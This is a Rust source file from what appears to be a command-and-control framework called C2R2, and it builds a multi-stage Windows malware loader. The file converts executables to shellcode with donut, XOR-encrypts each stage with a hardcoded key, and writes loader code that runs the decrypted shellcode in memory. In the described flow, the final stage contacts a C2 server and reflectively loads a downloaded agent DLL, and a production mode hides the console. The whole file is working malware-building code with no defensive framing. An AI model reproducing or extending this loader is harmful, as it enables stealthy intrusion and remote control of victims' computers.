//! Multi-Stage Builder - Builds the complete ESTER → JAVELIN → Stage0-Lite pipeline
//!
//! This module implements the iterative build process:
//! 1. Build Stage0-Lite (C) → donut shellcode → XOR encrypt → stage0_payload.bin for JAVELIN
//! 2. Compile JAVELIN (include_bytes! stage0_payload.bin) → Convert to shellcode (donut) → Encrypt → Embed in ESTER source
//! 3. Compile ESTER (with JAVELIN) → Final executable
//!
//! Each stage is encrypted with a unique XOR key for security
//!
//! **Key improvement**: Uses donut to convert EXEs to position-independent shellcode
//! so they can be executed directly in memory without a PE loader.

use crate::dll_encrypt::{generate_random_key, xor_encrypt};
use std::fs;
use std::path::{Path, PathBuf};
use std::process::Command;

/// Configuration for multi-stage build
pub struct StageConfig {
    /// C2 server address (IP:PORT)
    pub server_address: String,
    /// Production mode (stealthy, no console)
    pub production: bool,
    /// Output directory for artifacts
    pub output_dir: PathBuf,
}

/// Converts an EXE to position-independent shellcode using donut
///
/// This is CRITICAL - EXE files cannot be executed directly via memory transmute.
/// They need to be converted to shellcode first using donut.
///
/// # Arguments
/// * `exe_path` - Path to the EXE file to convert
/// * `output_path` - Path where the shellcode will be saved
///
/// # Returns
/// * `Ok(Vec<u8>)` - The shellcode bytes
/// * `Err(_)` - Conversion failed
fn convert_exe_to_shellcode(exe_path: &Path, output_path: &Path) -> Result<Vec<u8>, Box<dyn std::error::Error>> {
    // Find donut.exe - check multiple locations
    let donut_locations = [
        PathBuf::from("donut_v1.1/donut.exe"),
        PathBuf::from("../donut_v1.1/donut.exe"),
        PathBuf::from(r"E:\repos\C2R2-v2.2\donut_v1.1\donut.exe"),
    ];

    let donut_exe = donut_locations.iter()
        .find(|p| p.exists())
        .ok_or("donut.exe not found. Make sure donut_v1.1 folder exists")?;

    println!("    Converting EXE to shellcode with donut...");
    println!("    Input: {}", exe_path.display());
    println!("    Output: {}", output_path.display());

    // Run donut to convert EXE to shellcode
    // -a 2 = amd64 only (our target)
    // -f 1 = binary format
    // -x 2 = exit process when done (safer for nested shellcode)
    // -e 3 = entropy + encryption
    // -t = Create new thread for loader (important for stability)
    let output = Command::new(donut_exe)
        .args(&[
            "-i", &exe_path.to_string_lossy(),
            "-o", &output_path.to_string_lossy(),
            "-a", "2",   // x64 only
            "-f", "1",   // binary format
            "-x", "2",   // exit process when done
            "-e", "3",   // entropy + encryption
            "-t",        // create new thread for loader
        ])
        .output()?;

    if !output.status.success() {
        let stderr = String::from_utf8_lossy(&output.stderr);
        let stdout = String::from_utf8_lossy(&output.stdout);
        return Err(format!(
            "donut conversion failed:\nstdout: {}\nstderr: {}",
            stdout, stderr
        ).into());
    }

    // Read the generated shellcode
    let shellcode = fs::read(output_path)?;
    println!("    Shellcode generated: {} bytes", shellcode.len());

    Ok(shellcode)
}

/// Builds the complete multi-stage system
pub fn build_staged_system(config: StageConfig) -> Result<PathBuf, Box<dyn std::error::Error>> {
    println!("╔════════════════════════════════════════╗");
    println!("║   Multi-Stage Builder (ESTER→JAVELIN→Stage0)   ║");
    println!("╚════════════════════════════════════════╝");
    println!();

    // Ensure output directory exists
    fs::create_dir_all(&config.output_dir)?;

    // Phase 1: Build Stage0-Lite and populate stages/javelin/src/stage0_payload.bin
    println!("[1/3] Building Stage0-Lite (C/WinHTTP bootstrap)...");
    build_stage0_lite(&config)?;
    println!("Stage0-Lite built and embedded in JAVELIN source");

    // Phase 2: Build JAVELIN (reads stage0_payload.bin via include_bytes!)
    println!("\n[2/3] Building JAVELIN with embedded Stage0-Lite...");
    let javelin_binary = build_javelin_lite(&config)?;
    println!("JAVELIN compiled: {} bytes", javelin_binary.len());

    // Phase 3: Build ESTER with embedded JAVELIN
    println!("\n[3/3] Building ESTER with embedded JAVELIN...");
    let javelin_key = generate_random_key(32);
    let ester_path = build_ester_with_javelin(&config, &javelin_binary, &javelin_key)?;
    println!("ESTER compiled: {}", ester_path.display());

    println!("\n Multi-stage system built successfully!");
    println!("\nExecution flow:");
    println!("   1. ester.exe validates environment");
    println!("   2. Decrypts and loads JAVELIN in memory");
    println!("   3. JAVELIN decrypts and loads Stage0-Lite shellcode in memory");
    println!("   4. Stage0-Lite contacts C2 at {}", config.server_address);
    println!("   5. Downloads agent DLL via /api/stage1/agent_dll and loads it reflectively");

    Ok(ester_path)
}

/// Builds Stage0-Lite using the C cross-compiler pipeline
///
/// Runs stages/stage0-lite/build.sh which:
/// 1. Cross-compiles C source with mingw-w64
/// 2. Converts EXE → shellcode via donut
/// 3. XOR-encrypts with key "C2R2_JAVELIN_STAGE0_KEY_2026_!!!!"
/// 4. Writes encrypted payload to stages/javelin/src/stage0_payload.bin
fn build_stage0_lite(config: &StageConfig) -> Result<(), Box<dyn std::error::Error>> {
    let (ip, port) = config.server_address.split_once(':')
        .ok_or("server_address must be in 'host:port' format (e.g. 192.168.1.10:4444)")?;

    // Ensure the build script exists
    let script = Path::new("stages/stage0-lite/build.sh");
    if !script.exists() {
        return Err("stages/stage0-lite/build.sh not found. Is the stage0-lite directory present?".into());
    }

    println!("    Invoking stages/stage0-lite/build.sh --ip {} --port {}", ip, port);

    let mut cmd = Command::new("bash");
    cmd.args(["stages/stage0-lite/build.sh", "--ip", ip, "--port", port]);
    if config.production {
        cmd.arg("--production");
    }

    let status = cmd.status()?;
    if !status.success() {
        return Err("stages/stage0-lite/build.sh failed".into());
    }

    // Verify output
    let payload_path = Path::new("stages/javelin/src/stage0_payload.bin");
    if !payload_path.exists() {
        return Err("stage0_payload.bin not found after build.sh; check the build logs".into());
    }
    let size = fs::metadata(payload_path)?.len();
    println!("    stage0_payload.bin: {} bytes", size);

    // Ensure loader.rs uses include_bytes! (idempotent write)
    update_javelin_loader_include_bytes()?;

    Ok(())
}

/// Updates Stage0 configuration with C2 server address
/// (Kept for compatibility, no longer used by the main pipeline)
#[allow(dead_code)]
fn update_stage0_config(server: &str) -> Result<(), Box<dyn std::error::Error>> {
    let config_content = format!(
        r#"//! Configuration for Stage0
pub const C2_SERVER: &str = "{}";

pub fn get_c2_server() -> &'static str {{
    C2_SERVER
}}

pub struct SessionConfig {{
    pub timeout: u64,
    pub max_retries: u32,
    pub retry_delay: u64,
}}

impl Default for SessionConfig {{
    fn default() -> Self {{
        Self {{
            timeout: 30,
            max_retries: 3,
            retry_delay: 5,
        }}
    }}
}}

#[used]
#[no_mangle]
pub static STAGE0_CONFIG_MARKER: &[u8; 32] = b"C2R2_STAGE0_CONFIG_MARKER___\0\0\0\0";
"#,
        server
    );

    fs::write("stages/stage0/src/config.rs", config_content)?;
    Ok(())
}

/// Builds JAVELIN (stage0-lite already embedded in source via include_bytes!)
///
/// stage0_payload.bin was written by build_stage0_lite / build.sh.
/// JAVELIN uses include_bytes!("stage0_payload.bin") - no inline byte array needed.
fn build_javelin_lite(config: &StageConfig) -> Result<Vec<u8>, Box<dyn std::error::Error>> {
    // Determine features
    let features = if config.production { "production" } else { "dev" };

    // Build JAVELIN - now uses include_bytes! so no code generation needed
    let mut args = vec![
        "build",
        "--release",
        "--target", "x86_64-pc-windows-msvc",
        "--package", "javelin",
    ];
    if config.production {
        args.push("--no-default-features");
    }
    args.extend(&["--features", features]);

    let status = Command::new("cargo")
        .args(&args)
        .status()?;

    if !status.success() {
        return Err("Failed to build JAVELIN".into());
    }

    // Read the compiled binary
    let binary_path = Path::new("target/x86_64-pc-windows-msvc/release/javelin.exe");
    let binary = fs::read(binary_path)?;

    Ok(binary)
}

/// Writes the JAVELIN loader.rs to use include_bytes! for Stage0-Lite
///
/// The encrypted shellcode is read at compile time from stage0_payload.bin.
/// This replaces the old approach of embedding a 6.5 MB byte array literal.
fn update_javelin_loader_include_bytes() -> Result<(), Box<dyn std::error::Error>> {
    let loader_content = r#"//! Stage 3 loader - Loads and executes Stage0-Lite (C-based bootstrap payload)
use crate::crypto::{decrypt_payload, CryptoAlgorithm};
use crate::memory::{allocate_rw, cleanup_memory, transition_rx};
use std::error::Error;

// Stage0-lite shellcode, XOR-encrypted at build time by stages/stage0-lite/build.sh
// Key: "C2R2_JAVELIN_STAGE0_KEY_2026_!!!!"
// Regenerate with: bash stages/stage0-lite/build.sh --ip <HOST> --port <PORT>
const ENCRYPTED_STAGE0: &[u8] = include_bytes!("stage0_payload.bin");
const STAGE0_XOR_KEY: &[u8] = b"C2R2_JAVELIN_STAGE0_KEY_2026_!!!!";

pub fn load_stage3() -> Result<(), Box<dyn Error>> {
    #[cfg(feature = "dev")]
    println!("[JAVELIN] Loading Stage 3 (Stage0-Lite)...");

    if ENCRYPTED_STAGE0.len() <= 1 {
        return Err("No Stage0 payload embedded (run build.sh first)".into());
    }

    #[cfg(feature = "dev")]
    println!("[JAVELIN] Decrypting Stage0-Lite ({} bytes)", ENCRYPTED_STAGE0.len());

    let decrypted = decrypt_payload(ENCRYPTED_STAGE0, STAGE0_XOR_KEY, CryptoAlgorithm::Xor)?;

    #[cfg(feature = "dev")]
    println!("[JAVELIN] Allocating {} bytes as RW", decrypted.len());

    let region = allocate_rw(decrypted.len())?;

    #[cfg(feature = "dev")]
    println!("[JAVELIN] Copying payload to memory");

    unsafe {
        std::ptr::copy_nonoverlapping(
            decrypted.as_ptr(),
            region.address(),
            decrypted.len(),
        );
    }

    #[cfg(feature = "dev")]
    println!("[JAVELIN] Transitioning memory to RX");

    transition_rx(&region)?;

    #[cfg(feature = "dev")]
    println!("[JAVELIN] Executing Stage0-Lite shellcode");

    unsafe {
        let stage0_entry: extern "C" fn() = std::mem::transmute(region.address());
        stage0_entry();
    }

    #[cfg(feature = "dev")]
    println!("[JAVELIN] Cleaning up memory");

    cleanup_memory(&region);

    #[cfg(feature = "dev")]
    println!("[JAVELIN] Stage0-Lite execution complete");

    Ok(())
}
"#;

    fs::write("stages/javelin/src/loader.rs", loader_content)?;
    Ok(())
}

/// Kept for compatibility: old update_javelin_loader with dynamic byte-array generation
/// (no longer called by the main pipeline; use update_javelin_loader_include_bytes instead)
#[allow(dead_code)]
fn update_javelin_loader(encrypted_payload: &[u8], key: &[u8]) -> Result<(), Box<dyn std::error::Error>> {
    let payload_literal = format_byte_array(encrypted_payload);
    let key_literal = format_byte_array(key);

    let loader_content = format!(
        r#"//! Stage 3 loader - Loads and executes Stage0 (the bootstrap payload)
use crate::crypto::{{decrypt_payload, CryptoAlgorithm}};
use crate::memory::{{allocate_rw, cleanup_memory, transition_rx}};
use std::error::Error;

const ENCRYPTED_STAGE0: &[u8] = &{};
const STAGE0_XOR_KEY: &[u8] = &{};

pub fn load_stage3() -> Result<(), Box<dyn Error>> {{
    #[cfg(feature = "dev")]
    println!("[JAVELIN] Loading Stage 3 (Stage0)...");

    if ENCRYPTED_STAGE0.len() <= 1 {{
        return Err("No Stage0 payload embedded".into());
    }}

    #[cfg(feature = "dev")]
    println!("[JAVELIN] Decrypting Stage0 ({{}} bytes)", ENCRYPTED_STAGE0.len());

    let decrypted = decrypt_payload(ENCRYPTED_STAGE0, STAGE0_XOR_KEY, CryptoAlgorithm::Xor)?;

    #[cfg(feature = "dev")]
    println!("[JAVELIN] Allocating {{}} bytes as RW", decrypted.len());

    let region = allocate_rw(decrypted.len())?;

    #[cfg(feature = "dev")]
    println!("[JAVELIN] Copying payload to memory");

    unsafe {{
        std::ptr::copy_nonoverlapping(
            decrypted.as_ptr(),
            region.address(),
            decrypted.len(),
        );
    }}

    #[cfg(feature = "dev")]
    println!("[JAVELIN] Transitioning memory to RX");

    transition_rx(&region)?;

    #[cfg(feature = "dev")]
    println!("[JAVELIN] Executing Stage0 shellcode");

    unsafe {{
        let stage0_entry: extern "C" fn() = std::mem::transmute(region.address());
        stage0_entry();
    }}

    #[cfg(feature = "dev")]
    println!("[JAVELIN] Cleaning up memory");

    cleanup_memory(&region);

    #[cfg(feature = "dev")]
    println!("[JAVELIN] Stage0 execution complete");

    Ok(())
}}
"#,
        payload_literal, key_literal
    );

    fs::write("stages/javelin/src/loader.rs", loader_content)?;
    Ok(())
}

/// Builds ESTER with embedded encrypted JAVELIN (converted to shellcode via donut)
fn build_ester_with_javelin(
    config: &StageConfig,
    javelin_binary: &[u8],
    key: &[u8],
) -> Result<PathBuf, Box<dyn std::error::Error>> {
    // CRITICAL: Convert JAVELIN EXE to shellcode first!
    // Raw EXE files cannot be executed via memory transmute - they need donut conversion
    println!("    Converting JAVELIN EXE to shellcode...");

    // Write JAVELIN EXE to temp file for donut processing
    let javelin_exe_path = config.output_dir.join("javelin_temp.exe");
    let javelin_shellcode_path = config.output_dir.join("javelin.bin");
    fs::write(&javelin_exe_path, javelin_binary)?;

    // Convert to shellcode using donut
    let javelin_shellcode = convert_exe_to_shellcode(&javelin_exe_path, &javelin_shellcode_path)?;

    // Clean up temp EXE
    let _ = fs::remove_file(&javelin_exe_path);

    // Encrypt the SHELLCODE (not the raw EXE!)
    let encrypted_javelin = xor_encrypt(&javelin_shellcode, key);

    // Update ESTER config with encrypted payload
    update_ester_config(&encrypted_javelin, key)?;

    // Determine features
    // In production: --no-default-features to disable 'dev' console window
    let features = if config.production { "production" } else { "dev" };

    // Build ESTER
    let mut args = vec![
        "build",
        "--release",
        "--target", "x86_64-pc-windows-msvc",
        "--package", "ester",
    ];
    if config.production {
        args.push("--no-default-features");
    }
    args.extend(&["--features", features]);

    let status = Command::new("cargo")
        .args(&args)
        .status()?;

    if !status.success() {
        return Err("Failed to build ESTER".into());
    }

    // Copy to output directory
    let source_path = Path::new("target/x86_64-pc-windows-msvc/release/ester.exe");
    let dest_path = config.output_dir.join("ester.exe");
    fs::copy(source_path, &dest_path)?;

    Ok(dest_path)
}

/// Updates ESTER configuration with encrypted JAVELIN
fn update_ester_config(encrypted_payload: &[u8], key: &[u8]) -> Result<(), Box<dyn std::error::Error>> {
    let payload_literal = format_byte_array(encrypted_payload);
    let key_literal = format_byte_array(key);

    let config_content = format!(
        r#"//! Configuration for Stage 1 (ESTER)
pub const ENCRYPTED_JAVELIN: &[u8] = &{};
pub const JAVELIN_XOR_KEY: &[u8] = &{};
pub const JAVELIN_DOWNLOAD_URL: &str = "";

#[used]
#[no_mangle]
pub static STAGE_CONFIG_MARKER: &[u8; 32] = b"C2R2_STAGE1_CONFIG_MARKER___\0\0\0\0";
"#,
        payload_literal, key_literal
    );

    fs::write("stages/ester/src/config.rs", config_content)?;
    Ok(())
}

/// Formats a byte array as a Rust literal
fn format_byte_array(bytes: &[u8]) -> String {
    if bytes.is_empty() {
        return "[]".to_string();
    }

    let mut result = String::from("[\n");
    for chunk in bytes.chunks(16) {
        result.push_str("    ");
        for (i, byte) in chunk.iter().enumerate() {
            if i > 0 {
                result.push_str(", ");
            }
            result.push_str(&format!("0x{:02x}", byte));
        }
        result.push_str(",\n");
    }
    result.push_str("]");
    result
}
